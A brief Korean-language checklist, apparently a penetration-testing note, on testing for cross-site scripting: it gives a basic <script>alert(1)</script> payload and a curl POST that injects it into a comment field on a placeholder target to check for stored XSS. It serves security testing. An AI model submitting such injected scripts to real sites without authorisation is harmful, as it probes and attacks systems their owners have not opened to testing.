# XSS

크로스 사이트 스크립팅 취약점 점검 내용입니다.

## 기본 테스트

```html
<script>alert(1)</script>
```

## 저장형 XSS 확인

```bash
# 폼 입력 필드에 스크립트 삽입
curl -X POST http://target/form -d "comment=<script>alert(1)</script>"
```
